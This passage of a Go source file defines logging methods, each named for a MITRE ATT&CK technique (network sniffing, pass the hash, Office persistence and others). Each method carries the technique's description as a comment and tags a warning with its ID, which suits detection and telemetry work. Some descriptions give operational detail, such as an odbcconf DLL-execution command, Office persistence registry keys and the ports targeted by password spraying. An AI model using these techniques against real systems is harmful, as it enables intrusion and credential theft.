directories on various systems across a network.  File sharing over a Windows
network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource)
(Citation: TechNet Shared Folder) Net can be used to query a remote system for
available shared drives using the net view \\remotesystem command. It can also
be used to query shared drives on the local system using net share.
*/
func (g *Session) ATTACKEntNetworkShareDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1135").
        Msg("network share discovery")
}

/* ATTACKEntNetworkSniffing Phases: credential-access discovery

Adversaries may sniff network traffic to capture information about an
environment, including authentication material passed over the network. Network
sniffing refers to using the network interface on a system to monitor or capture
information sent over a wired or wireless connection. An adversary may place a
network interface into promiscuous mode to passively access data in transit over
the network, or use span ports to capture a larger amount of data. Data captured
via this technique may include user credentials, especially those sent over an
insecure, unencrypted protocol. Techniques for name service resolution
poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to
capture credentials to websites, proxies, and internal systems by redirecting
traffic to an adversary. Network sniffing may also reveal configuration details,
such as running services, version numbers, and other network characteristics
(e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral
Movement and/or Defense Evasion activities.
*/
func (g *Session) ATTACKEntNetworkSniffing(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1040").
        Msg("network sniffing")
}

/* ATTACKEntNetworkTopology Phases: reconnaissance

Adversaries may gather information about the victim's network topology that can
be used during targeting. Information about network topologies may include a
variety of details, including the physical and/or logical arrangement of both
external-facing and internal network environments. This information may also
include specifics regarding network devices (gateways, routers, etc.) and other
infrastructure. Adversaries may gather this information in various ways, such as
direct collection actions via Active Scanning or Phishing for Information.
Information about network topologies may also be exposed to adversaries via
online or other accessible data sets (ex: Search Victim-Owned
Websites).(Citation: DNS Dumpster) Gathering this information may reveal
opportunities for other forms of reconnaissance (ex: Search Open Technical
Databases or Search Open Websites/Domains), establishing operational resources
(ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access
(ex: External Remote Services).
*/
func (g *Session) ATTACKEntNetworkTopology(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1590.004").
        Msg("network topology")
}

/* ATTACKEntNetworkTrustDependencies Phases: reconnaissance

Adversaries may gather information about the victim's network trust dependencies
that can be used during targeting. Information about network trusts may include
a variety of details, including second or third-party organizations/domains (ex:
managed service providers, contractors, etc.) that have connected (and
potentially elevated) network access. Adversaries may gather this information in
various ways, such as direct elicitation via Phishing for Information.
Information about network trusts may also be exposed to adversaries via online
or other accessible data sets (ex: Search Open Technical Databases).(Citation:
Pentesting AD Forests) Gathering this information may reveal opportunities for
other forms of reconnaissance (ex: Active Scanning or Search Open
Websites/Domains), establishing operational resources (ex: Acquire
Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted
Relationship).
*/
func (g *Session) ATTACKEntNetworkTrustDependencies(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1590.003").
        Msg("network trust dependencies")
}

/* ATTACKEntNonApplicationLayerProtocol Phases: command-and-control

Adversaries may use a non-application layer protocol for communication between
host and C2 server or among infected hosts within a network. The list of
possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples
include use of network layer protocols, such as the Internet Control Message
Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol
(UDP), session layer protocols, such as Socket Secure (SOCKS), as well as
redirected/tunneled protocols, such as Serial over LAN (SOL). ICMP communication
between hosts is one example.(Citation: Cisco Synful Knock Evolution)  Because
ICMP is part of the Internet Protocol Suite, it is required to be implemented by
all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as
commonly monitored as other Internet Protocols such as TCP or UDP and may be
used by adversaries to hide communications.
*/
func (g *Session) ATTACKEntNonApplicationLayerProtocol(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1095").
        Msg("non-application layer protocol")
}

/* ATTACKEntNonStandardEncoding Phases: command-and-control

Adversaries may encode data with a non-standard data encoding system to make the
content of command and control traffic more difficult to detect. Command and
control (C2) information can be encoded using a non-standard data encoding
system that diverges from existing protocol specifications. Non-standard data
encoding schemes may be based on or related to standard data encoding schemes,
such as a modified Base64 encoding for the message body of an HTTP
request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia
Character Encoding)
*/
func (g *Session) ATTACKEntNonStandardEncoding(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1132.002").
        Msg("non-standard encoding")
}

/* ATTACKEntNonStandardPort Phases: command-and-control

Adversaries may communicate using a protocol and port paring that are typically
not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar
2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the
traditional port 443. Adversaries may make changes to the standard port used by
a protocol to bypass filtering or muddle analysis/parsing of network data.
*/
func (g *Session) ATTACKEntNonStandardPort(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1571").
        Msg("non-standard port")
}

/* ATTACKEntOSCredentialDumping Phases: credential-access

Adversaries may attempt to dump credentials to obtain account login and
credential material, normally in the form of a hash or a clear text password,
from the operating system and software. Credentials can then be used to perform
Lateral Movement and access restricted information. Several of the tools
mentioned in associated sub-techniques may be used by both adversaries and
professional security testers. Additional custom tools likely exist as well.
*/
func (g *Session) ATTACKEntOSCredentialDumping(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1003").
        Msg("os credential dumping")
}

/* ATTACKEntOSExhaustionFlood Phases: impact

Adversaries may target the operating system (OS) for a DoS attack, since the
(OS) is responsible for managing the finite resources on a system. These attacks
do not need to exhaust the actual resources on a system since they can simply
exhaust the limits that an OS self-imposes to prevent the entire system from
being overwhelmed by excessive demands on its capacity. Different ways to
achieve this exist, including TCP state-exhaustion attacks such as SYN floods
and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods,
excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never
completed. Because each OS has a maximum number of concurrent TCP connections
that it will allow, this can quickly exhaust the ability of the system to
receive new requests for TCP connections, thus preventing access to any TCP
service provided by the server.(Citation: Cloudflare SynFlood) ACK floods
leverage the stateful nature of the TCP protocol. A flood of ACK packets are
sent to the target. This forces the OS to search its state table for a related
TCP connection that has already been established. Because the ACK packets are
for connections that do not exist, the OS will have to search the entire state
table to confirm that no match exists. When it is necessary to do this for a
large flood of packets, the computational requirements can cause the server to
become sluggish and/or unresponsive, due to the work it must do to eliminate the
rogue ACK packets. This greatly reduces the resources available for providing
the targeted service.(Citation: Corero SYN-ACKflood)
*/
func (g *Session) ATTACKEntOSExhaustionFlood(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1499.001").
        Msg("os exhaustion flood")
}

/* ATTACKEntObfuscatedFilesorInformation Phases: defense-evasion

Adversaries may attempt to make an executable or file difficult to discover or
analyze by encrypting, encoding, or otherwise obfuscating its contents on the
system or in transit. This is common behavior that can be used across different
platforms and the network to evade defenses.  Payloads may be compressed,
archived, or encrypted in order to avoid detection. These payloads may be used
during Initial Access or later to mitigate detection. Sometimes a user's action
may be required to open and Deobfuscate/Decode Files or Information for User
Execution. The user may also be required to input a password to open a password
protected compressed/encrypted file that was provided by the adversary.
(Citation: Volexity PowerDuke November 2016) Adversaries may also used
compressed or archived scripts, such as JavaScript.  Portions of files can also
be encoded to hide the plain-text strings that would otherwise help defenders
with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads
may also be split into separate, seemingly benign files that only reveal
malicious functionality when reassembled. (Citation: Carbon Black Obfuscation
Sept 2016) Adversaries may also obfuscate commands executed from payloads or
directly via a Command and Scripting Interpreter. Environment variables,
aliases, characters, and other platform/language specific semantics can be used
to evade signature based detections and application control mechanisms.
(Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation
July 2017)(Citation: PaloAlto EncodedCommand March 2017)
*/
func (g *Session) ATTACKEntObfuscatedFilesorInformation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1027").
        Msg("obfuscated files or information")
}

/* ATTACKEntObtainCapabilities Phases: resource-development

Adversaries may buy and/or steal capabilities that can be used during targeting.
Rather than developing their own capabilities in-house, adversaries may
purchase, freely download, or steal them. Activities may include the acquisition
of malware, software (including licenses), exploits, certificates, and
information relating to vulnerabilities. Adversaries may obtain capabilities to
support their operations throughout numerous phases of the adversary lifecycle.
In addition to downloading free malware, software, and exploits from the
internet, adversaries may purchase these capabilities from third-party entities.
Third-party entities can include technology companies that specialize in malware
and exploits, criminal marketplaces, or from individuals.(Citation:
NationsBuying)(Citation: PegasusCitizenLab) In addition to purchasing
capabilities, adversaries may steal capabilities from third-party entities
(including other adversaries). This can include stealing software licenses,
malware, SSL/TLS and code-signing certificates, or raiding closed databases of
vulnerabilities or exploits.(Citation: DiginotarCompromise)
*/
func (g *Session) ATTACKEntObtainCapabilities(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1588").
        Msg("obtain capabilities")
}

/* ATTACKEntOdbcconf Phases: defense-evasion

Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads.
Odbcconf.exe is a Windows utility that allows you to configure Open Database
Connectivity (ODBC) drivers and data source names.(Citation: Microsoft
odbcconf.exe) Odbcconf.exe is digitally signed by Microsoft. Adversaries may
abuse odbcconf.exe to bypass application control solutions that do not account
for its potential abuse. Similar to Regsvr32, odbcconf.exe has a REGSVR flag
that can be misused to execute DLLs (ex: odbcconf.exe /S /A {REGSVR
"C:\Users\Public\file.dll"}). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro
Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017)
*/
func (g *Session) ATTACKEntOdbcconf(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1218.008").
        Msg("odbcconf")
}

/* ATTACKEntOfficeApplicationStartup Phases: persistence

Adversaries may leverage Microsoft Office-based applications for persistence
between startups. Microsoft Office is a fairly common application suite on
Windows-based operating systems within an enterprise network. There are multiple
mechanisms that can be used with Office for persistence when an Office-based
application is started; this can include the use of Office Template Macros and
add-ins. A variety of features have been discovered in Outlook that can be
abused to obtain persistence, such as Outlook rules, forms, and Home
Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work
within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook
Rules)
*/
func (g *Session) ATTACKEntOfficeApplicationStartup(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1137").
        Msg("office application startup")
}

/* ATTACKEntOfficeTemplateMacros Phases: persistence

Adversaries may abuse Microsoft Office templates to obtain persistence on a
compromised system. Microsoft Office contains templates that are part of common
Office applications and are used to customize styles. The base templates within
the application are used each time an application starts. (Citation: Microsoft
Change Normal Template) Office Visual Basic for Applications (VBA) macros
(Citation: MSDN VBA in Office) can be inserted into the base template and used
to execute code when the respective Office application starts in order to obtain
persistence. Examples for both Word and Excel have been discovered and
published. By default, Word has a Normal.dotm template created that can be
modified to include a malicious macro. Excel does not have a template file
created by default, but one can be added that will automatically be
loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template
Macros) Shared templates may also be stored and pulled from remote
locations.(Citation: GlobalDotName Jun 2019)  Word Normal.dotm location:
C:\Users\<username>\AppData\Roaming\Microsoft\Templates\Normal.dotm Excel
Personal.xlsb location:
C:\Users\<username>\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB
Adversaries may also change the location of the base template to point to their
own by hijacking the application's search order, e.g. Word 2016 will first look
for Normal.dotm under C:\Program Files (x86)\Microsoft Office\root\Office16\, or
by modifying the GlobalDotName registry key. By modifying the GlobalDotName
registry key an adversary can specify an arbitrary location, file name, and file
extension to use for the template that will be loaded on application startup. To
abuse GlobalDotName, adversaries may first need to register the template as a
trusted document or place it in a trusted location.(Citation: GlobalDotName Jun
2019)  An adversary may need to enable macros to execute unrestricted depending
on the system or enterprise security policy on use of macros.
*/
func (g *Session) ATTACKEntOfficeTemplateMacros(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1137.001").
        Msg("office template macros")
}

/* ATTACKEntOfficeTest Phases: persistence

Adversaries may abuse the Microsoft Office "Office Test" Registry key to obtain
persistence on a compromised system. An Office Test Registry location exists
that allows a user to specify an arbitrary DLL that will be executed every time
an Office application is started. This Registry key is thought to be used by
Microsoft to load DLLs for testing and debugging purposes while developing
Office applications. This Registry key is not created by default during an
Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office
Test Sofacy) There exist user and global Registry keys for the Office Test
feature:  HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf
HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf  Adversaries may
add this Registry key and specify a malicious DLL that will be executed whenever
an Office application, such as Word or Excel, is started.
*/
func (g *Session) ATTACKEntOfficeTest(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1137.002").
        Msg("office test")
}

/* ATTACKEntOneWayCommunication Phases: command-and-control

Adversaries may use an existing, legitimate external Web service as a means for
sending commands to a compromised system without receiving return output over
the Web service channel. Compromised systems may leverage popular websites and
social media to host command and control (C2) instructions. Those infected
systems may opt to send the output from those commands back over a different C2
channel, including to another distinct Web service. Alternatively, compromised
systems may return no output at all in cases where adversaries want to send
instructions to systems and do not want a response. Popular websites and social
media acting as a mechanism for C2 may give a significant amount of cover due to
the likelihood that hosts within a network are already communicating with them
prior to a compromise. Using common services, such as those offered by Google or
Twitter, makes it easier for adversaries to hide in expected noise. Web service
providers commonly use SSL/TLS encryption, giving adversaries an added level of
protection.
*/
func (g *Session) ATTACKEntOneWayCommunication(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1102.003").
        Msg("one-way communication")
}

/* ATTACKEntOutlookForms Phases: persistence

Adversaries may abuse Microsoft Outlook forms to obtain persistence on a
compromised system. Outlook forms are used as templates for presentation and
functionality in Outlook messages. Custom Outlook forms can be created that will
execute code when a specifically crafted email is sent by an adversary utilizing
the same custom Outlook form.(Citation: SensePost Outlook Forms) Once malicious
forms have been added to the user’s mailbox, they will be loaded when Outlook is
started. Malicious forms will execute when an adversary sends a specifically
crafted email to the user.(Citation: SensePost Outlook Forms)
*/
func (g *Session) ATTACKEntOutlookForms(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1137.003").
        Msg("outlook forms")
}

/* ATTACKEntOutlookHomePage Phases: persistence

Adversaries may abuse Microsoft Outlook's Home Page feature to obtain
persistence on a compromised system. Outlook Home Page is a legacy feature used
to customize the presentation of Outlook folders. This feature allows for an
internal or external URL to be loaded and presented whenever a folder is opened.
A malicious HTML page can be crafted that will execute code when loaded by
Outlook Home Page.(Citation: SensePost Outlook Home Page) Once malicious home
pages have been added to the user’s mailbox, they will be loaded when Outlook is
started. Malicious Home Pages will execute when the right Outlook folder is
loaded/reloaded.(Citation: SensePost Outlook Home Page)
*/
func (g *Session) ATTACKEntOutlookHomePage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1137.004").
        Msg("outlook home page")
}

/* ATTACKEntOutlookRules Phases: persistence

Adversaries may abuse Microsoft Outlook rules to obtain persistence on a
compromised system. Outlook rules allow a user to define automated behavior to
manage email messages. A benign rule might, for example, automatically move an
email to a particular folder in Outlook if it contains specific words from a
specific sender. Malicious Outlook rules can be created that can trigger code
execution when an adversary sends a specifically crafted email to that
user.(Citation: SilentBreak Outlook Rules) Once malicious rules have been added
to the user’s mailbox, they will be loaded when Outlook is started. Malicious
rules will execute when an adversary sends a specifically crafted email to the
user.(Citation: SilentBreak Outlook Rules)
*/
func (g *Session) ATTACKEntOutlookRules(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1137.005").
        Msg("outlook rules")
}

/* ATTACKEntParentPIDSpoofing Phases: defense-evasion privilege-escalation

Adversaries may spoof the parent process identifier (PPID) of a new process to
evade process-monitoring defenses or to elevate privileges. New processes are
typically spawned directly from their parent, or calling, process unless
explicitly specified. One way of explicitly assigning the PPID of a new process
is via the CreateProcess API call, which supports a parameter that defines the
PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality
is used by Windows features such as User Account Control (UAC) to correctly set
the PPID after a requested elevated process is spawned by SYSTEM (typically via
svchost.exe or consent.exe) rather than the current user context.(Citation:
Microsoft UAC Nov 2018) Adversaries may abuse these mechanisms to evade
defenses, such as those blocking processes spawning directly from Office
documents, and analysis targeting unusual/potentially malicious parent-child
process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be
explorer.exe rather than an Office document delivered as part of Spearphishing
Attachment.(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be
executed via Visual Basic within a malicious Office document or any code that
can perform Native API.(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation:
CounterCept PPID Spoofing Dec 2018) Explicitly assigning the PPID may also
enable elevated privileges given appropriate access rights to the parent
process. For example, an adversary in a privileged user context (i.e.
administrator) may spawn a new process and assign the parent as a process
running as SYSTEM (such as lsass.exe), causing the new process to be elevated
via the inherited access token.(Citation: XPNSec PPID Nov 2017)
*/
func (g *Session) ATTACKEntParentPIDSpoofing(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1134.004").
        Msg("parent pid spoofing")
}

/* ATTACKEntPasstheHash Phases: defense-evasion lateral-movement

Adversaries may “pass the hash” using stolen password hashes to move laterally
within an environment, bypassing normal system access controls. Pass the hash
(PtH) is a method of authenticating as a user without having access to the
user's cleartext password. This method bypasses standard authentication steps
that require a cleartext password, moving directly into the portion of the
authentication that uses the password hash. When performing PtH, valid password
hashes for the account being used are captured using a Credential Access
technique. Captured hashes are used with PtH to authenticate as that user. Once
authenticated, PtH may be used to perform actions on local or remote systems.
Adversaries may also use stolen password hashes to "overpass the hash." Similar
to PtH, this involves using a password hash to authenticate as a user but also
uses the password hash to create a valid Kerberos ticket. This ticket can then
be used to perform Pass the Ticket attacks.(Citation: Stealthbits Overpass-the-
Hash)
*/
func (g *Session) ATTACKEntPasstheHash(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1550.002").
        Msg("pass the hash")
}

/* ATTACKEntPasstheTicket Phases: defense-evasion lateral-movement

Adversaries may “pass the ticket” using stolen Kerberos tickets to move
laterally within an environment, bypassing normal system access controls. Pass
the ticket (PtT) is a method of authenticating to a system using Kerberos
tickets without having access to an account's password. Kerberos authentication
can be used as the first step to lateral movement to a remote system. When
preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS
Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may
be obtained, depending on the level of access. A service ticket allows for
access to a particular resource, whereas a TGT can be used to request service
tickets from the Ticket Granting Service (TGS) to access any resource the user
has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation:
GentilKiwi Pass the Ticket) A Silver Ticket can be obtained for services that
use Kerberos as an authentication mechanism and are used to generate tickets to
access that particular resource and the system that hosts the resource (e.g.,
SharePoint).(Citation: ADSecurity AD Kerberos Attacks) A Golden Ticket can be
obtained for the domain using the Key Distribution Service account KRBTGT
account NTLM hash, which enables generation of TGTs for any account in Active
Directory.(Citation: Campbell 2014) Adversaries may also create a valid Kerberos
ticket using other user information, such as stolen password hashes or AES keys.
For example, "overpassing the hash" involves using a NTLM password hash to
authenticate as a user (i.e. Pass the Hash) while also using the password hash
to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)
*/
func (g *Session) ATTACKEntPasstheTicket(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1550.003").
        Msg("pass the ticket")
}

/* ATTACKEntPasswordCracking Phases: credential-access

Adversaries may use password cracking to attempt to recover usable credentials,
such as plaintext passwords, when credential material such as password hashes
are obtained. OS Credential Dumping is used to obtain password hashes, this may
only get an adversary so far when Pass the Hash is not an option. Techniques to
systematically guess the passwords used to compute hashes are available, or the
adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes
is usually done on adversary-controlled systems outside of the target
network.(Citation: Wikipedia Password cracking) The resulting plaintext password
resulting from a successfully cracked hash may be used to log into systems,
resources, and services in which the account has access.
*/
func (g *Session) ATTACKEntPasswordCracking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1110.002").
        Msg("password cracking")
}

/* ATTACKEntPasswordFilterDLL Phases: credential-access defense-evasion persistence

Adversaries may register malicious password filter dynamic link libraries (DLLs)
into the authentication process to acquire user credentials as they are
validated.  Windows password filters are password policy enforcement mechanisms
for both domain and local accounts. Filters are implemented as DLLs containing a
method to validate potential passwords against password policies. Filter DLLs
can be positioned on local computers for local accounts and/or domain
controllers for domain accounts. Before registering new passwords in the
Security Accounts Manager (SAM), the Local Security Authority (LSA) requests
validation from each registered filter. Any potential changes cannot take effect
until every registered filter acknowledges validation.  Adversaries can register
malicious password filters to harvest credentials from local computers and/or
entire domains. To perform proper validation, filters must receive plain-text
credentials from the LSA. A malicious password filter would receive these plain-
text credentials every time a password request is made.(Citation: Carnal Ownage
Password Filters Sept 2013)
*/
func (g *Session) ATTACKEntPasswordFilterDLL(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1556.002").
        Msg("password filter dll")
}

/* ATTACKEntPasswordGuessing Phases: credential-access

Adversaries with no prior knowledge of legitimate credentials within the system
or environment may guess passwords to attempt access to accounts. Without
knowledge of the password for an account, an adversary may opt to systematically
guess the password using a repetitive or iterative mechanism. An adversary may
guess login credentials without prior knowledge of system or environment
passwords during an operation by using a list of common passwords. Password
guessing may or may not take into account the target's policies on password
complexity or use policies that may lock accounts out after a number of failed
attempts. Guessing passwords can be a risky option because it could cause
numerous authentication failures and account lockouts, depending on the
organization's login failure policies. (Citation: Cylance Cleaver) Typically,
management services over commonly used ports are used when guessing passwords.
Commonly targeted services include the following:  SSH (22/TCP) Telnet (23/TCP)
FTP (21/TCP) NetBIOS / SMB / Samba (139/TCP & 445/TCP) LDAP (389/TCP) Kerberos
(88/TCP) RDP / Terminal Services (3389/TCP) HTTP/HTTP Management Services
(80/TCP & 443/TCP) MSSQL (1433/TCP) Oracle (1521/TCP) MySQL (3306/TCP) VNC
(5900/TCP)  In addition to management services, adversaries may "target single
sign-on (SSO) and cloud-based applications utilizing federated authentication
protocols," as well as externally facing email applications, such as Office
365.(Citation: US-CERT TA18-068A 2018) In default environments, LDAP and
Kerberos connection attempts are less likely to trigger events over SMB, which
creates Windows "logon failure" event ID 4625.
*/
func (g *Session) ATTACKEntPasswordGuessing(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1110.001").
        Msg("password guessing")
}

/* ATTACKEntPasswordManagers Phases: credential-access

Adversaries may acquire user credentials from third-party password
managers.(Citation: ise Password Manager February 2019) Password managers are
applications designed to store user credentials, normally in an encrypted
database. Credentials are typically accessible after a user provides a master
password that unlocks the database. After the database is unlocked, these
credentials may be copied to memory. These databases can be stored as files on
disk.(Citation: ise Password Manager February 2019) Adversaries may acquire user
credentials from password managers by extracting the master password and/or
plain-text credentials from memory.(Citation: FoxIT Wocao December
2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory
via Exploitation for Credential Access.(Citation: NVD CVE-2019-3610)
Adversaries may also try brute forcing via Password Guessing to obtain the
master password of a password manager.(Citation: Cyberreason Anchor December
2019)
*/
func (g *Session) ATTACKEntPasswordManagers(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1555.005").
        Msg("password managers")
}

/* ATTACKEntPasswordPolicyDiscovery Phases: discovery

Adversaries may attempt to access detailed information about the password policy
used within an enterprise network. Password policies for networks are a way to
enforce complex passwords that are difficult to guess or crack through Brute
Force. This would help the adversary to create a list of common passwords and
launch dictionary and/or brute force attacks which adheres to the policy (e.g.
if the minimum password length should be 8, then not trying passwords such as
'pass123'; not checking for more than 3-4 passwords per account if the lockout
is set to 6 as to not lock out accounts). Password policies can be set and
discovered on Windows, Linux, and macOS systems via various command shell
utilities such as net accounts (/domain), Get-ADDefaultDomainPasswordPolicy,
chage -l , cat /etc/pam.d/common-password, and pwpolicy
getaccountpolicies.(Citation: Superuser Linux Password Policies) (Citation: Jamf
User Password Policies)
*/
func (g *Session) ATTACKEntPasswordPolicyDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1201").
        Msg("password policy discovery")
}

/* ATTACKEntPasswordSpraying Phases: credential-access

Adversaries may use a single or small list of commonly used passwords against
many different accounts to attempt to acquire valid account credentials.
Password spraying uses one password (e.g. 'Password01'), or a small list of
commonly used passwords, that may match the complexity policy of the domain.
Logins are attempted with that password against many different accounts on a
network to avoid account lockouts that would normally occur when brute forcing a
single account with many passwords. (Citation: BlackHillsInfosec Password
Spraying) Typically, management services over commonly used ports are used when
password spraying. Commonly targeted services include the following:  SSH
(22/TCP) Telnet (23/TCP) FTP (21/TCP) NetBIOS / SMB / Samba (139/TCP & 445/TCP)
LDAP (389/TCP) Kerberos (88/TCP) RDP / Terminal Services (3389/TCP) HTTP/HTTP
Management Services (80/TCP & 443/TCP) MSSQL (1433/TCP) Oracle (1521/TCP) MySQL
(3306/TCP) VNC (5900/TCP)  In addition to management services, adversaries may
"target single sign-on (SSO) and cloud-based applications utilizing federated
authentication protocols," as well as externally facing email applications, such
as Office 365.(Citation: US-CERT TA18-068A 2018) In default environments, LDAP
and Kerberos connection attempts are less likely to trigger events over SMB,
which creates Windows "logon failure" event ID 4625.
*/
func (g *Session) ATTACKEntPasswordSpraying(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1110.003").
        Msg("password spraying")
}

/* ATTACKEntPatchSystemImage Phases: defense-evasion

Adversaries may modify the operating system of a network device to introduce new
capabilities or weaken existing defenses.(Citation: Killing the myth of Cisco
IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS
Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper
Netscreen of the Dead) Some network devices are built with a monolithic
architecture, where the entire operating system and most of the functionality of
the device is contained within a single file.  Adversaries may change this file
in storage, to be loaded in a future boot, or in memory during runtime. To
change the operating system in storage, the adversary will typically use the
standard procedures available to device operators. This may involve downloading
a new file via typical protocols used on network devices, such as TFTP, FTP,
SCP, or a console connection.  The original file may be overwritten, or a new
file may be written alongside of it and the device reconfigured to boot to the
compromised image. To change the operating system in memory, the adversary
typically can use one of two methods. In the first, the adversary would make use
of native debug commands in the original, unaltered running operating system
that allow them to directly modify the relevant memory addresses containing the
running operating system.  This method typically requires administrative level
access to the device. In the second method for changing the operating system in
memory, the adversary would make use of the boot loader. The boot loader is the
first piece of software that loads when the device starts that, in turn, will
launch the operating system.  Adversaries may use malicious code previously
implanted in the boot loader, such as through the ROMMONkit method, to directly
manipulate running operating system code in memory.  This malicious code in the
bootloader provides the capability of direct memory manipulation to the
adversary, allowing them to patch the live operating system during runtime. By
modifying the instructions stored in the system image file, adversaries may
either weaken existing defenses or provision new capabilities that the device
did not have before. Examples of existing defenses that can be impeded include
encryption, via Weaken Encryption, authentication, via Network Device
Authentication, and perimeter defenses, via Network Boundary Bridging.  Adding
new capabilities for the adversary’s purpose include Keylogging, Multi-hop
Proxy, and Port Knocking. Adversaries may also compromise existing commands in
the operating system to produce false output to mislead defenders.   When this
method is used in conjunction with Downgrade System Image, one example of a
compromised system command may include changing the output of the command that
shows the version of the currently running operating system.  By patching the
operating system, the adversary can change this command to instead display the
original, higher revision number that they replaced through the system
downgrade.  When the operating system is patched in storage, this can be
achieved in either the resident storage (typically a form of flash memory, which
is non-volatile) or via TFTP Boot.  When the technique is performed on the
running operating system in memory and not on the stored copy, this technique
will not survive across reboots.  However, live memory modification of the
operating system can be combined with ROMMONkit to achieve persistence.
*/
func (g *Session) ATTACKEntPatchSystemImage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1601.001").
        Msg("patch system image")
}

/* ATTACKEntPathInterception Phases: persistence privilege-escalation

This technique has been deprecated. Please use Path Interception by PATH
Environment Variable, Path Interception by Search Order Hijacking, and/or Path
Interception by Unquoted Path. Path interception occurs when an executable is
placed in a specific path so that it is executed by an application instead of
the intended target. One example of this was the use of a copy of cmd in the
current working directory of a vulnerable application that loads a CMD or BAT
file with the CreateProcess function. (Citation: TechNet MS14-019) There are
multiple distinct weaknesses or misconfigurations that adversaries may take
advantage of when performing path interception: unquoted paths, path environment
variable misconfigurations, and search order hijacking. The first vulnerability
deals with full program paths, while the second and third occur when program
paths are not specified. These techniques can be used for persistence if
executables are called on a regular basis, as well as privilege escalation if
intercepted executables are started by a higher privileged process. Unquoted
Paths Service paths (stored in Windows Registry keys) (Citation: Microsoft
Subkey) and shortcut paths are vulnerable to path interception if the path has
one or more spaces and is not surrounded by quotation marks (e.g., C:\unsafe
path with space\program.exe vs. "C:\safe path with space\program.exe").
(Citation: Baggett 2012) An adversary can place an executable in a higher level
directory of the path, and Windows will resolve that executable instead of the
intended executable. For example, if the path in a shortcut is C:\program
files\myapp.exe, an adversary may create a program at C:\program.exe that will
be run instead of the intended program. (Citation: SecurityBoulevard Unquoted
Services APR 2018) (Citation: SploitSpren Windows Priv Jan 2018) PATH
Environment Variable Misconfiguration The PATH environment variable contains a
list of directories. Certain methods of executing a program (namely using
cmd.exe or the command-line) rely solely on the PATH environment variable to
determine the locations that are searched for a program when the path for the
program is not given. If any directories are listed in the PATH environment
variable before the Windows directory, %SystemRoot%\system32 (e.g.,
C:\Windows\system32), a program may be placed in the preceding directory that is
named the same as a Windows program (such as cmd, PowerShell, or Python), which
will be executed when that command is executed from a script or command-line.
For example, if C:\example path precedes C:\Windows\system32 is in the PATH
environment variable, a program that is named net.exe and placed in C:\example
path will be called instead of the Windows system "net" when "net" is executed
